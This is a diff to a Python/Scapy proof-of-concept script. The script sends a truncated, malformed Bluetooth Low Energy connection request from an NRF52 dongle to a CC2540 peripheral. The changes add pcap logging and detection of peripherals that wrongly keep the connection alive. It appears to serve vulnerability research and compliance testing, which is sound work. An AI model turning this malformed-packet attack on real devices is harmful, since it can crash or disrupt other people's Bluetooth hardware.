@@ -21,7 +21,7 @@ send_version_ind = False
 end_connection = False
 
 def send(scapy_pkt, print_tx=True):
-	driver.raw_send(raw(scapy_pkt))
+	driver.send(scapy_pkt)
 	if print_tx:
 		print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])
 
@@ -66,11 +66,12 @@ def scan_timeout():
 	timeout_scan.start()
 
 
+already_connected = False
 # Default master address
 master_address = '5d:36:ac:90:0b:22'
 access_address = 0x9a328370
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200')
+driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename = 'CC2540_truncated_connection_success.pcap')
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
             ScanA=master_address,
@@ -101,13 +102,17 @@ while True:
 				print(Fore.RED + 'NRF52 Dongle not detected')
 				sys.exit(0)
 			continue
-		elif slave_connected and BTLE_EMPTY_PDU not in pkt:
-			# Print slave data channel PDUs summary
-			print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
 		# --------------- Process Link Layer Packets here ------------------------------------
 		# Check if packet from advertised is received
-		if pkt:
-			print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
+		if BTLE_DATA in pkt:
+			timeout.cancel()
+			print(Fore.YELLOW + "Slave RX <--- " + pkt.summary()[7:] + Fore.RESET)
+			print(Fore.RED + 
+				'Extreme non-compliance detected.\nPeripheral is mantaining a connection initiated under a truncated connection request')
+			if already_connected == False:
+				already_connected = True
+				driver.save_pcap()
+
 		if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
 			timeout.cancel()
 			print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
@@ -125,7 +130,7 @@ while True:
             # ---------------------28 Bytes until here--------------------------
             # Truncated when sending over the air, but the initiator will try the following:
             chM=0x0000000001, 
-            hop=5, # any, including 0
+            hop=0, # any, including 0
             SCA=0, # Clock tolerance
 			)
 			# This means that the initiator will send the anchor point (Empty PDU) on channel 1 and stay there for every connection event)
@@ -139,7 +144,6 @@ while True:
 
 			# Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!		
 			send(conn_request)
-			wrpcap('CC2540_connection_req_crash.pcap', conn_request)
 			print(Fore.YELLOW + 'Malformed connection request was sent')
 
 			# Start the timeout to detect crashes
